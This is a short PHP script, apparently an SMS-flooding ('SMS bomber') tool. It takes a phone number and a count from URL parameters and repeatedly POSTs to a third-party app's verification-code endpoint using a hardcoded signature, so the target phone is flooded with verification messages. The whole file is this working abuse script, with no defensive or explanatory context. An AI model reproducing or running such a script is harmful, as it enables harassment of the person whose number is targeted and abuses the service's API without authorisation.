<?php
$amount = $_GET['amount'];
	$x = 1;
	while($x <= $amount) {
	$number = $_GET['number'];
	$url = "https://onyolo.com/parse/functions/sendVerificationCode";

		$ch = curl_init($url);
		$jsonData = array("phoneNumber"=>"$number", "as"=>"d32aJDsGDf93xxM1eKDrVsBc3wmNJbGGPx2liWnt4zQ=","timestamp"=>"1585686380924");
		$jsonDataEncoded = json_encode($jsonData);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonDataEncoded);
		curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json')); 
		$result = curl_exec($ch);
  		$x++;
	} 
?>